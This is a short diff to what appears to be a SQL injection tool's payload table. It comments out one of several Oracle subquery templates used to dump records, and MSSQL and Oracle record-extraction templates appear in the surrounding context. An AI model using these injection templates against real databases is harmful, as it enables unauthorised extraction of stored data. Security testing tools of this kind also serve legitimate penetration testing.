@@ -2071,7 +2071,7 @@ PAYLOADS_RECS_DUMP = {
         "(SELECT TOP 1 {col} FROM {tbl} WHERE 1=1)",
     ],
     "Oracle": [
-        "(SELECT {col} FROM (SELECT {col},ROWNUM AS LIMIT FROM {tbl} {col} ORDER BY ROWNUM) WHERE LIMIT=1)",
+        # "(SELECT {col} FROM (SELECT {col},ROWNUM AS LIMIT FROM {tbl} {col} ORDER BY ROWNUM) WHERE LIMIT=1)",
         "(SELECT {col} FROM (SELECT {col},ROWNUM AS LIMIT FROM {tbl}) WHERE LIMIT=1)",
         "(SELECT {col} FROM (SELECT qq.*,ROWNUM AS LIMIT FROM {tbl} qq ORDER BY ROWNUM) WHERE LIMIT=1)",
     ],
